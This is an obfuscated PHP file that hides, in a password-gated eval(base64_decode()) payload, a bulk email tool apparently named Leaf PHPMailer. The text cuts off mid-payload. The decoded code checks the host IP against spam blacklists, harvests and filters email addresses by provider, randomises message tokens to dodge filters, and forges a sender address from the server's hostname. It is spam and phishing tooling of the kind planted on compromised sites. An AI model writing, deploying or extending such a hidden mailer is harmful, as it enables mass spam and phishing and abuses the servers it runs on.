<?php 
$password ="cool500";
eval(base64_decode("CgpzZXNzaW9uX3N0YXJ0KCk7CmVycm9yX3JlcG9ydGluZygwKTsKc2V0X3RpbWVfbGltaXQoMCk7CmluaV9zZXQoIm1lbW9yeV9saW1pdCIsLTEpOwoKJGxlYWZbJ3ZlcnNpb24nXT0iMi44IjsKJGxlYWZbJ3dlYnNpdGUnXT0ibGVhZm1haWxlci5wdyI7CgoKJHNlc3Npb25jb2RlID0gbWQ1KF9fRklMRV9fKTsKaWYoIWVtcHR5KCRwYXNzd29yZCkgYW5kICRfU0VTU0lPTlskc2Vzc2lvbmNvZGVdICE9ICRwYXNzd29yZCl7CiAgICBpZiAoaXNzZXQoJF9SRVFVRVNUWydwYXNzJ10pIGFuZCAkX1JFUVVFU1RbJ3Bhc3MnXSA9PSAkcGFzc3dvcmQpIHsKICAgICAgICAkX1NFU1NJT05bJHNlc3Npb25jb2RlXSA9ICRwYXNzd29yZDsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHByaW50ICI8cHJlIGFsaWduPWNlbnRlcj48Zm9ybSBtZXRob2Q9cG9zdD5QYXNzd29yZDogPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwYXNzJz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nPj4nPjwvZm9ybT48L3ByZT4iOwogICAgICAgIGV4aXQ7ICAgICAgICAKICAgIH0KfQoKc2Vzc2lvbl93cml0ZV9jbG9zZSgpOwoKCmZ1bmN0aW9uIGxlYWZDbGVhcigkdGV4dCwkZW1haWwpewoJJGUgPSBleHBsb2RlKCdAJywgJGVtYWlsKTsKCSRlbWFpbHVzZXI9JGVbMF07CgkkZW1haWxkb21haW49JGVbMV07CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXRpbWUtXSIsIGRhdGUoIm0vZC9ZIGg6aTpzIGEiLCB0aW1lKCkpLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLWVtYWlsLV0iLCAkZW1haWwsICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstZW1haWx1c2VyLV0iLCAkZW1haWx1c2VyLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLWVtYWlsZG9tYWluLV0iLCAkZW1haWxkb21haW4sICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tbGV0dGVycy1dIiwgcmFuZFN0cmluZygnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1yYW5kb21zdHJpbmctXSIsIHJhbmRTdHJpbmcoJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OScpLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbW51bWJlci1dIiwgcmFuZFN0cmluZygnMDEyMzQ1Njc4OScpLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbW1kNS1dIiwgbWQ1KHJhbmRTdHJpbmcoJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OScpKSwgJHRleHQpOwogICAgcmV0dXJuICR0ZXh0OyAgCn0KZnVuY3Rpb24gbGVhZlRyaW0oJHN0cmluZyl7Cgkkc3RyaW5nPXVybGRlY29kZSgkc3RyaW5nKTsKICAgIHJldHVybiBzdHJpcHNsYXNoZXModHJpbSgkc3RyaW5nKSk7Cn0KZnVuY3Rpb24gcmFuZFN0cmluZygkY29uc29uYW50cykgewogICAgJGxlbmd0aD1yYW5kKDEyLDI1KTsKICAgICRwYXNzd29yZCA9ICcnOwogICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgewogICAgICAgICAgICAkcGFzc3dvcmQgLj0gJGNvbnNvbmFudHNbKHJhbmQoKSAlIHN0cmxlbigkY29uc29uYW50cykpXTsKICAgIH0KICAgIHJldHVybiAkcGFzc3dvcmQ7Cn0KZnVuY3Rpb24gbGVhZk1haWxDaGVjaygkZW1haWwpewogICAgaWYgKGZpbHRlcl92YXIoJGVtYWlsLCBGSUxURVJfVkFMSURBVEVfRU1BSUwpKSByZXR1cm4gdHJ1ZTsKICAgIGVsc2UgcmV0dXJuIGZhbHNlOwp9CiMgQnVsaXQtaW4gQmxhY2tMaXN0IENoZWNrZXIgCmlmKGlzc2V0KCRfR0VUWydjaGVja19pcCddKSl7CiAgICBpZiAoaXNzZXQoJF9HRVRbJ2hvc3QnXSkpewogICAgICAgICRfR0VUWydob3N0J109ZXhwbG9kZSgiLCIsICRfR0VUWydob3N0J10pOwogICAgICAgIGZvcmVhY2ggKCRfR0VUWydob3N0J10gYXMgJGhvc3QpIHsKICAgICAgICAgICAgaWYgKGNoZWNrZG5zcnIoJF9HRVRbJ2NoZWNrX2lwJ10gLiAiLiIgLiAgJGhvc3QgLiAiLiIsICJBIikpICRjaGVjaz0gIjxmb250IGNvbG9yPSdyZWQnPiBMaXN0ZWQ8L2ZvbnQ+IjsKICAgICAgICAgICAgZWxzZSAkY2hlY2s9ICI8Zm9udCBjb2xvcj0nZ3JlZW4nPiBDbGVhbjwvZm9udD4iOwogICAgICAgICAgICBwcmludCAnZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIicuICRob3N0LiciKS5pbm5lckhUTUwgPSAiJy4kY2hlY2suJyI7JzsKICAgICAgICB9CgogICAgICAgIGV4aXQ7CiAgICB9CiAgICAkZG5zYmxfbG9va3VwID0gWwogICAgICAgICJhbGwuczVoLm5ldCIsCiAgICAgICAgImIuYmFycmFjdWRhY2VudHJhbC5vcmciLAogICAgICAgICJibC5zcGFtY29wLm5ldCIsCiAgICAgICAgImJsYWNrbGlzdC53b29keS5jaCIsCiAgICAgICAgImJvZ29ucy5jeW1ydS5jb20iLAogICAgICAgICJjYmwuYWJ1c2VhdC5vcmciLAogICAgICAgICJjZGwuYW50aS1zcGFtLm9yZy5jbiIsCiAgICAgICAgImNvbWJpbmVkLmFidXNlLmNoIiwKICAgICAgICAiZGIud3BibC5pbmZvIiwKICAgICAgICAiZG5zYmwtMS51Y2Vwcm90ZWN0Lm5ldCIsCiAgICAgICAgImRuc2JsLTIudWNlcHJvdGVjdC5uZXQiLAogICAgICAgICJkbnNibC0zLnVjZXByb3RlY3QubmV0IiwKICAgICAgICAiZG5zYmwuYW50aWNhcHRjaGEubmV0IiwKICAgICAgICAiZG5zYmwuZHJvbmVibC5vcmciLAogICAgICAgICJkbnNibC5pbnBzLmRlIiwKICAgICAgICAiZG5zYmwuc29yYnMubmV0IiwKICAgICAgICAiZHJvbmUuYWJ1c2UuY2giLAogICAgICAgICJkdWludi5hdXBhZHMub3JnIiwKICAgICAgICAiZHVsLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgImR5bmEuc3BhbXJhdHMuY29tIiwKICAgICAgICAiZHluaXAucm90aGVuLmNvbSIsCiAgICAgICAgImh0dHAuZG5zYmwuc29yYnMubmV0IiwKICAgICAgICAiaXBzLmJhY2tzY2F0dGVyZXIub3JnIiwKICAgICAgICAiaXguZG5zYmwubWFuaXR1Lm5ldCIsCiAgICAgICAgImtvcmVhLnNlcnZpY2VzLm5ldCIsCiAgICAgICAgIm1pc2MuZG5zYmwuc29yYnMubmV0IiwKICAgICAgICAibm9wdHIuc3BhbXJhdHMuY29tIiwKICAgICAgICAib3J2ZWRiLmF1cGFkcy5vcmciLAogICAgICAgICJwYmwuc3BhbWhhdXMub3JnIiwKICAgICAgICAicHJveHkuYmwuZ3dlZXAuY2EiLAogICAgICAgICJwc2JsLnN1cnJpZWwuY29tIiwKICAgICAgICAicmVsYXlzLmJsLmd3ZWVwLmNhIiwKICAgICAgICAicmVsYXlzLm5ldGhlci5uZXQiLAogICAgICAgICJzYmwuc3BhbWhhdXMub3JnIiwKICAgICAgICAic2hvcnQucmJsLmpwIiwKICAgICAgICAic2luZ3VsYXIudHRrLnB0ZS5odSIsCiAgICAgICAgInNtdHAuZG5zYmwuc29yYnMubmV0IiwKICAgICAgICAic29ja3MuZG5zYmwuc29yYnMubmV0IiwKICAgICAgICAic3BhbS5hYnVzZS5jaCIsCiAgICAgICAgInNwYW0uZG5zYmwuYW5vbm1haWxzLmRlIiwKICAgICAgICAic3BhbS5kbnNibC5zb3Jicy5uZXQiLAogICAgICAgICJzcGFtLnNwYW1yYXRzLmNvbSIsCiAgICAgICAgInNwYW1ib3QuYmxzLmRpZ2liYXNlLmNhIiwKICAgICAgICAic3BhbXJibC5pbXAuY2giLAogICAgICAgICJzcGFtc291cmNlcy5mYWJlbC5kayIsCiAgICAgICAgInVibC5sYXNoYmFjay5jb20iLAogICAgICAgICJ1YmwudW5zdWJzY29yZS5jb20iLAogICAgICAgICJ2aXJ1cy5yYmwuanAiLAogICAgICAgICJ3ZWIuZG5zYmwuc29yYnMubmV0IiwKICAgICAgICAid29ybXJibC5pbXAuY2giLAogICAgICAgICJ4Ymwuc3BhbWhhdXMub3JnIiwKICAgICAgICAiei5tYWlsc3Bpa2UubmV0IiwKICAgICAgICAiemVuLnNwYW1oYXVzLm9yZyIsCiAgICAgICAgInpvbWJpZS5kbnNibC5zb3Jicy5uZXQiLAogICAgXTsKICAgICRyZXZlcnNlX2lwID0gaW1wbG9kZSgiLiIsIGFycmF5X3JldmVyc2UoZXhwbG9kZSgiLiIsICRfR0VUWydjaGVja19pcCddKSkpOwogICAgJGRuc1QgPSBjb3VudCgkZG5zYmxfbG9va3VwKTsKICAgIGxlYWZoZWFkZXIoKTsKICAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb250YWluZXIgY29sLWxnLTYiPjxoMz48Zm9udCBjb2xvcj0iZ3JlZW4iPjxzcGFuIGNsYXNzPSJnbHlwaGljb24gZ2x5cGhpY29uLWxlYWYiPjwvc3Bhbj48L2ZvbnQ+IExlYWYgUEhQTWFpbGVyIDxzbWFsbD5CbGFja2xpc3QgQ2hlY2tlcjwvc21hbGw+PC9oMz4nOwogICAgUHJpbnQgIkNoZWNraW5nIDxiPiIuJF9HRVRbJ2NoZWNrX2lwJ10uIjwvYj4gaW4gPGI+JGRuc1Q8L2I+ICBhbnRpLXNwYW0gZGF0YWJhc2VzOjxicj4iOwogICAgJGRuc049IiI7CiAgICBwcmludCAnPHRhYmxlID4nOwogICAgZm9yICgkaT0wOyAkaSA8ICRkbnNUOyAkaT0kaSsxMCkgeyAKICAgICAgICAkaG9zdD0iIjsKICAgICAgICAkaG9zdHM9IiI7CiAgICAgICAgZm9yKCRqPSRpOyAkajwkaSsxMDskaisrKXsKICAgICAgICAgICAgJGhvc3Q9JGRuc2JsX2xvb2t1cFskal07CiAgICAgICAgICAgIGlmKCFlbXB0eSgkaG9zdCkpewogICAgICAgICAgICAgICAgcHJpbnQgIjx0cj4gPHRkPiRob3N0PC90ZD4gPHRkIGlkPSckaG9zdCc+Q2hlY2tpbmcgLi48L3RkPjwvdHI+IjsKICAgICAgICAgICAgICAgICRob3N0cyAuPSIkaG9zdCwiOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRkbnNOLj0iPHNjcmlwdCBzcmM9Jz9jaGVja19pcD0kcmV2ZXJzZV9pcCZob3N0PSIuJGhvc3RzLiInIHR5cGU9J3RleHQvamF2YXNjcmlwdCc+PC9zY3JpcHQ+IjsKICAgIH0KCiAgICBwcmludCAnPC90YWJsZT48L2Rpdj4nOwogICAgcHJpbnQgJGRuc047CiAgICBleGl0Owp9CmlmKGlzc2V0KCRfR0VUWydlbWFpbGZpbHRlciddKSl7CgogICAgaWYoIWVtcHR5KCRfRklMRVNbJ2ZpbGVUb1VwbG9hZCddWyd0bXBfbmFtZSddKSl7CiAgICAgICAgJF9QT1NUWydlbWFpbExpc3QnXT0gZmlsZV9nZXRfY29udGVudHMoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0pOyAKICAgIH0KICAgICRfUE9TVFsnZW1haWxMaXN0J109c3RydG9sb3dlcigkX1BPU1RbJ2VtYWlsTGlzdCddKTsKICAgaWYoJF9HRVRbJ2VtYWlsZmlsdGVyJ109PSJpZnJhbSIpewogICAgICAgIGlmICgkX1BPU1RbJ3Jlc3VsdHR5cGUnXSA9PSAiZG93bmxvYWQiKXsKICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LURlc2NyaXB0aW9uOiBGaWxlIFRyYW5zZmVyIik7IAogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIik7IAogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPWVtYWlscyIudGltZSgpLiIudHh0Iik7CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbiIpOwogICAgICAgIH0KICAgIGlmKCRfUE9TVFsnc3VibWl0J109PSJleHRyYWN0Iil7CiAgICAgICAgJHBhdHRlcm4gPSAnL1tBLVphLXowLTkuXyUrLV0rQFtBLVphLXowLTkuLV0rXC5bQS1aYS16XXsyLDR9Lyc7CiAgICAgICAgcHJlZ19tYXRjaF9hbGwoJHBhdHRlcm4sICRfUE9TVFsnZW1haWxMaXN0J10sICRtYXRjaGVzKTsKICAgICAgICBmb3JlYWNoICgkbWF0Y2hlc1swXSBhcyAkZW1haWwpIHsKICAgICAgICAgICAgcHJpbnQgJGVtYWlsLiJcbiI7CiAgICAgICAgfQogICAgfQogICAgZWxzZWlmICgkX1BPU1RbJ3N1Ym1pdCddPT0iZmlsdGVyIikgewogICAgICAgICRlbWFpbHM9ZXhwbG9kZSgiXG4iLCAkX1BPU1RbJ2VtYWlsTGlzdCddKTsKICAgICAgICAka2V5d29yZHM9ZXhwbG9kZSgiXG4iLCBzdHJ0b2xvd2VyKCRfUE9TVFsna2V5d29yZHMnXSkpOwogICAgICAgIGZvcmVhY2ggKCRlbWFpbHMgYXMgJGVtYWlsKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRrZXl3b3JkcyBhcyAka2V5d29yZCApIHsKICAgICAgICAgICAgICAgIGlmKHN0cnN0cigkZW1haWwsICRrZXl3b3JkKSApewogICAgICAgICAgICAgICAgICAgIHByaW50ICRlbWFpbC4iXG4iOwogICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgfQogICAgZXhpdDsKICAgfQogICBsZWFmaGVhZGVyKCk7CiAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb250YWluZXIgY29sLWxnLTQiPjxoMz48Zm9udCBjb2xvcj0iZ3JlZW4iPjxzcGFuIGNsYXNzPSJnbHlwaGljb24gZ2x5cGhpY29uLWxlYWYiPjwvc3Bhbj48L2ZvbnQ+IExlYWYgUEhQTWFpbGVyIDxzbWFsbD5FbWFpbCBGaWx0ZXI8L3NtYWxsPjwvaDM+JzsKICAgcHJpbnQgJwogICAgPGZvcm0gYWN0aW9uPSI/ZW1haWxmaWx0ZXI9aWZyYW0iIG1ldGhvZD0iUE9TVCIgdGFyZ2V0PSJteS1pZnJhbWUiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG9uc3VibWl0PVwnXCc+CiAgICAgICAgPGxhYmVsIGZvcj0iZW1haWxMaXN0Ij5UZXh0IDwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVUb1VwbG9hZCIgaWQ9ImZpbGVUb1VwbG9hZCI+IAogICAgICAgIG9yCgogICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJlbWFpbExpc3QiIGlkPSJlbWFpbExpc3QiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjciIGlkPSJ0ZXh0QXJlYSI+PC90ZXh0YXJlYT4KICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyYWRpbyI+CiAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0icmVzdWx0dHlwZSIgaWQ9InJlc3VsdHR5cGUiIHZhbHVlPSJoZXJlIiBjaGVja2VkPSIiPgogICAgICAgICAgICBTaG93IFJlc3VsdCBpbiB0aGlzIHBhZ2UKICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0icmFkaW8iPgogICAgICAgICAgPGxhYmVsPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InJlc3VsdHR5cGUiIGlkPSJyZXN1bHR0eXBlIiB2YWx1ZT0iZG93bmxvYWQiPgogICAgICAgICAgICBEb3dubG9hZCBSZXN1bHQgKGZvciBiaWcgbnVtYmVycykKICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgICAgICAgICA8bGVnZW5kPjxoND5FeHRyYWN0IEVtYWlsPC9oND48L2xlZ2VuZD4KICAgICAgICAgICAgRGV0ZWN0aW5nIGV2ZXJ5IGVtYWlsICgxMDAlKSBhbmQgb3JkZXIgdGhlbSBsaW5lIGJ5IGxpbmUgPGJyPjxicj4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iZXh0cmFjdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20iPlN0YXJ0PC9idXR0b24+CiAgICAgICAgICAgIDxsZWdlbmQ+PGg0PkZpbHRlciBFbWFpbHM8L2g0PjwvbGVnZW5kPgogICAgICAgIDxsYWJlbCA+S2V5d29yZHMgPHNtYWxsPiBleDogZ21haWwuY29tIG9yIC5jby51azwvc21hbGw+IDwvbGFiZWw+PHRleHRhcmVhIG5hbWU9ImtleXdvcmRzIiBpZD0ia2V5d29yZHMiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjQiIGlkPSJ0ZXh0QXJlYSI+Z21haWwuY29tCmhvdG1haWwuY29tCnlhaG9vLmNvbQouY28udWs8L3RleHRhcmVhPjxicj4KCiAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJmaWx0ZXIiIGNsYXNzPSJidG4gYnRuLWRlZmF1bHQgYnRuLXNtIj5TdGFydDwvYnV0dG9uPgogICAgPC9mb3JtPgogICAgPGxhYmVsID5SZXN1bHQgPC9sYWJlbD4KICAgIDxpZnJhbWUgc3R5bGU9ImJvcmRlcjpub25lO3dpZHRoOjEwMCU7IiBuYW1lPSJteS1pZnJhbWUiICBzcmM9Ij9lbWFpbGZpbHRlcj1pZnJhbSIgPjwvaWZyYW1lPgogICAnOwogICBleGl0OwoKfQokaHRtbD0iY2hlY2tlZCI7CiR1dGY4PSJzZWxlY3RlZCI7CiRiaXQ4PSJzZWxlY3RlZCI7CgppZigkX1BPU1RbJ2FjdGlvbiddPT0ic2VuZCIgb3IgJF9QT1NUWydhY3Rpb24nXT09InNjb3JlIil7CgogICAgJHNlbmRlckVtYWlsPWxlYWZUcmltKCRfUE9TVFsnc2VuZGVyRW1haWwnXSk7CiAgICAkc2VuZGVyTmFtZT1sZWFmVHJpbSgkX1BPU1RbJ3NlbmRlck5hbWUnXSk7CiAgICAkcmVwbHlUbz1sZWFmVHJpbSgkX1BPU1RbJ3JlcGx5VG8nXSk7CiAgICAkc3ViamVjdD1sZWFmVHJpbSgkX1BPU1RbJ3N1YmplY3QnXSk7CiAgICAkZW1haWxMaXN0PWxlYWZUcmltKCRfUE9TVFsnZW1haWxMaXN0J10pOwogICAgJG1lc3NhZ2VUeXBlPWxlYWZUcmltKCRfUE9TVFsnbWVzc2FnZVR5cGUnXSk7CiAgICAkbWVzc2FnZUxldHRlcj1sZWFmVHJpbSgkX1BPU1RbJ21lc3NhZ2VMZXR0ZXInXSk7CiAgICAkZW5jb2RpbmcgPSAkX1BPU1RbJ2VuY29kZSddOwogICAgJGNoYXJzZXQgPSAkX1BPU1RbJ2NoYXJzZXQnXTsKICAgICRodG1sPSIiOwogICAgJHV0Zjg9IiI7CiAgICAkYml0OD0iIjsKCiAgICBpZigkbWVzc2FnZVR5cGU9PTIpICRwbGFpbj0iY2hlY2tlZCI7CiAgICBlbHNlICRodG1sPSJjaGVja2VkIjsKCiAgICBpZigkY2hhcnNldD09IklTTy04ODU5LTEiKSAkaXNvPSJzZWxlY3RlZCI7CiAgICBlbHNlICR1dGY4PSJzZWxlY3RlZCI7CgogICAgaWYoJGVuY29kaW5nPT0iN2JpdCIpICRiaXQ3PSJzZWxlY3RlZCI7CiAgICBlbHNlaWYoJGVuY29kaW5nPT0iYmluYXJ5IikgJGJpbmFyeT0ic2VsZWN0ZWQiOwogICAgZWxzZWlmKCRlbmNvZGluZz09ImJhc2U2NCIpICRiYXNlNjQ9InNlbGVjdGVkIjsKICAgIGVsc2VpZigkZW5jb2Rpbmc9PSJxdW90ZWQtcHJpbnRhYmxlIikgJHF1b3RlZHByaW50YWJsZT0ic2VsZWN0ZWQiOwogICAgZWxzZSAkYml0OD0ic2VsZWN0ZWQiOwoKCgp9CmlmKCRfUE9TVFsnYWN0aW9uJ109PSJ2aWV3Iil7Cgkkdmlld01lc3NhZ2U9bGVhZlRyaW0oJF9QT1NUWydtZXNzYWdlTGV0dGVyJ10pOwoJJHZpZXdNZXNzYWdlPWxlYWZDbGVhcigkdmlld01lc3NhZ2UsInVzZXJAZG9tYWluLmNvbSIpOwoJaWYgKCRfUE9TVFsnbWVzc2FnZVR5cGUnXT09Mil7CgkJcHJpbnQgIjxwcmU+Ii5odG1sc3BlY2lhbGNoYXJzKCR2aWV3TWVzc2FnZSkuIjwvcHJlPiI7Cgl9CgllbHNlIHsKCQlwcmludCAkdmlld01lc3NhZ2U7Cgl9CglleGl0Owp9CgoKCmlmKCFpc3NldCgkX1BPU1RbJ3NlbmRlckVtYWlsJ10pKXsKICAgICRzZW5kZXJFbWFpbD0ic3VwcG9ydEAiLnN0cl9yZXBsYWNlKCJ3d3cuIiwgIiIsICRfU0VSVkVSWydIVFRQX0hPU1QnXSk7CiAgICBpZiAoIWxlYWZNYWlsQ2hlY2soJHNlbmRlckVtYWlsKSkgJHNlbmRlckVtYWlsPSIiOwp9CgpjbGFzcyBQSFBNYWlsZXIKewogICAgLyoqCiAgICAgKiBUaGUgUEhQTWFpbGVyIFZlcnNpb24gbnVtYmVyLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRWZXJzaW9uID0gJzUuMi4yOCc7CgogICAgLyoqCiAgICAgKiBFbWFpbCBwcmlvcml0eS4KICAgICAqIE9wdGlvbnM6IG51bGwgKGRlZmF1bHQpLCAxID0gSGlnaCwgMyA9IE5vcm1hbCwgNSA9IGxvdy4KICAgICAqIFdoZW4gbnVsbCwgdGhlIGhlYWRlciBpcyBub3Qgc2V0IGF0IGFsbC4KICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgJFByaW9yaXR5ID0gbnVsbDsKCiAgICAvKioKICAgICAqIFRoZSBjaGFyYWN0ZXIgc2V0IG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDaGFyU2V0ID0gJ2lzby04ODU5LTEnOwoKICAgIC8qKgogICAgICogVGhlIE1JTUUgQ29udGVudC10eXBlIG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDb250ZW50VHlwZSA9ICd0ZXh0L3BsYWluJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlIGVuY29kaW5nLgogICAgICogT3B0aW9uczogIjhiaXQiLCAiN2JpdCIsICJiaW5hcnkiLCAiYmFzZTY0IiwgYW5kICJxdW90ZWQtcHJpbnRhYmxlIi4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkRW5jb2RpbmcgPSAnOGJpdCc7CgogICAgLyoqCiAgICAgKiBIb2xkcyB0aGUgbW9zdCByZWNlbnQgbWFpbGVyIGVycm9yIG1lc3NhZ2UuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEVycm9ySW5mbyA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIEZyb20gZW1haWwgYWRkcmVzcyBmb3IgdGhlIG1lc3NhZ2UuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEZyb20gPSAncm9vdEBsb2NhbGhvc3QnOwoKICAgIC8qKgogICAgICogVGhlIEZyb20gbmFtZSBvZiB0aGUgbWVzc2FnZS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkRnJvbU5hbWUgPSAnUm9vdCBVc2VyJzsKCiAgICAvKioKICAgICAqIFRoZSBTZW5kZXIgZW1haWwgKFJldHVybi1QYXRoKSBvZiB0aGUgbWVzc2FnZS4KICAgICAqIElmIG5vdCBlbXB0eSwgd2lsbCBiZSBzZW50IHZpYSAtZiB0byBzZW5kbWFpbCBvciBhcyAnTUFJTCBGUk9NJyBpbiBzbXRwIG1vZGUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFNlbmRlciA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFJldHVybi1QYXRoIG9mIHRoZSBtZXNzYWdlLgogICAgICogSWYgZW1wdHksIGl0IHdpbGwgYmUgc2V0IHRvIGVpdGhlciBGcm9tIG9yIFNlbmRlci4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAZGVwcmVjYXRlZCBFbWFpbCBzZW5kZXJzIHNob3VsZCBuZXZlciBzZXQgYSByZXR1cm4tcGF0aCBoZWFkZXI7CiAgICAgKiBpdCdzIHRoZSByZWNlaXZlcidzIGpvYiAoUkZDNTMyMSBzZWN0aW9uIDQuNCksIHNvIHRoaXMgbm8gbG9uZ2VyIGRvZXMgYW55dGhpbmcuCiAgICAgKiBAbGluayBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNTMyMSNzZWN0aW9uLTQuNCBSRkM1MzIxIHJlZmVyZW5jZQogICAgICovCiAgICBwdWJsaWMgJFJldHVyblBhdGggPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBTdWJqZWN0IG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTdWJqZWN0ID0gJyc7CgogICAgLyoqCiAgICAgKiBBbiBIVE1MIG9yIHBsYWluIHRleHQgbWVzc2FnZSBib2R5LgogICAgICogSWYgSFRNTCB0aGVuIGNhbGwgaXNIVE1MKHRydWUpLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRCb2R5ID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgcGxhaW4tdGV4dCBtZXNzYWdlIGJvZHkuCiAgICAgKiBUaGlzIGJvZHkgY2FuIGJlIHJlYWQgYnkgbWFpbCBjbGllbnRzIHRoYXQgZG8gbm90IGhhdmUgSFRNTCBlbWFpbAogICAgICogY2FwYWJpbGl0eSBzdWNoIGFzIG11dHQgJiBFdWRvcmEuCiAgICAgKiBDbGllbnRzIHRoYXQgY2FuIHJlYWQgSFRNTCB3aWxsIHZpZXcgdGhlIG5vcm1hbCBCb2R5LgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRBbHRCb2R5ID0gJyc7CgogICAgLyoqCiAgICAgKiBBbiBpQ2FsIG1lc3NhZ2UgcGFydCBib2R5LgogICAgICogT25seSBzdXBwb3J0ZWQgaW4gc2ltcGxlIGFsdCBvciBhbHRfaW5saW5lIG1lc3NhZ2UgdHlwZXMKICAgICAqIFRvIGdlbmVyYXRlIGlDYWwgZXZlbnRzLCB1c2UgdGhlIGJ1bmRsZWQgZXh0cmFzL0Vhc3lQZWFzeUlDUy5waHAgY2xhc3Mgb3IgaUNhbGNyZWF0b3IKICAgICAqIEBsaW5rIGh0dHA6Ly9zcHJhaW4uY2gvYmxvZy9kb3dubG9hZHMvcGhwLWNsYXNzLWVhc3lwZWFzeWljcy1jcmVhdGUtaWNhbC1maWxlcy13aXRoLXBocC8KICAgICAqIEBsaW5rIGh0dHA6Ly9raWdrb25zdWx0LnNlL2lDYWxjcmVhdG9yLwogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRJY2FsID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgY29tcGxldGUgY29tcGlsZWQgTUlNRSBtZXNzYWdlIGJvZHkuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRNSU1FQm9keSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIGNvbXBsZXRlIGNvbXBpbGVkIE1JTUUgbWVzc2FnZSBoZWFkZXJzLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkTUlNRUhlYWRlciA9ICcnOwoKICAgIC8qKgogICAgICogRXh0cmEgaGVh